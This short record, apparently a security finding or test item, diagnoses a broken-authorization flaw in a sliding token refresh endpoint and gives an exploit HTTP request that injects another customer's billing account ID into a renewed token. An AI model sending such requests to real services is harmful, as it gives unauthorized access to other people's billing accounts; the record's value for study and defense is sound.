diagnosis: When sliding tokens are refreshed, the endpoint accepts active_billing_account_id in the payload and injects it into the renewed token without verifying that the authenticated user possesses authorization on that billing account.
exploit_request:
POST /api/token/sliding-refresh/ HTTP/1.1
Host: billing.fintechapi.io
Content-Type: application/json

{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6...", "active_billing_account_id": "acc_enterprise_victim_441"}
